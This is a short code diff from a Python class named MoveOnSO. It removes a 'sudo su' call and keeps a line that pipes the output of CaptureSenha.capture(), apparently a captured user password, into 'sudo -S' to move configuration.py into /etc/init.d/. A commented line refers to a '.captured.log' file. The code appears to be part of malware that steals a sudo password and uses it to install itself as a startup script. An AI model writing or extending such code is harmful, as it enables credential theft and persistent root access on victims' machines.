@@ -53,8 +53,6 @@ class MoveOnSO:
     def export():
         # system(f'cp .captured.log config.py')
         sleep(1)
-        system('sudo su')
-        sleep(1)
         system(f'echo {CaptureSenha.capture()} | sudo -S mv configuration.py /etc/init.d/')
 
 
